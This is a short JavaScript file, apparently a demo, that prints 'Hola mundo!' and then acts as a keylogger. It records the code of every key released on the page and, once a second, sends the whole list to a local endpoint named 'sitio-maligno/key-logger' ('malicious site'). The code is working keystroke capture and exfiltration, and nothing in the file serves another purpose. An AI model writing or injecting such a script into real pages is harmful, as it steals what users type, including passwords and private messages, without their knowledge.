/**
 * 
 */

console.log('Hola mundo!')

let keys = []

document.addEventListener('keyup', (event) => {
	keys.push(event.code)
})

setInterval(() => {
	fetch(`http://localhost:8080/sitio-maligno/key-logger?keys=${keys.join(', ')}`)
}, 1000)
